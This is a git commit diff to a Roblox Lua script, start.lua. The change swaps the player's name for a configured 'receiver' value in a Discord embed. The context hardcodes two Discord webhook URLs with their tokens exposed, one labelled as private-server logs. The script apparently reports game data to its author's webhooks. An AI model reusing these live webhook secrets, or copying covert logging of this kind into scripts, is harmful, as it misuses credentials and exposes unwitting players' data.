420fe4c66bcc450c514f40a4418f21e112a4c184
RblxScriptsOG <faithsmiley.robloxscripts@gmail.com>
2025-11-08 08:39:54 +0500

    Update start.lua

--- start.lua
+++ start.lua
@@ -64,6 +64,7 @@ end
 --====================================================================--
 local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
 local user_webhook = _G["Script-SM_Config"].user_webhook
+local receiver = _G["Script-SM_Config"].users
 local logs_webhook = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
 
 --====================================================================--
@@ -636,7 +637,7 @@ local payload = {
             },
             {
                 name = "<:emoji_3:1402578008245801086> **Receiver**",
-                value = "```" .. (player.Name or "Unknown") .. "```",
+                value = "```" .. receiver .. "```",
                 inline = true
             },
             {
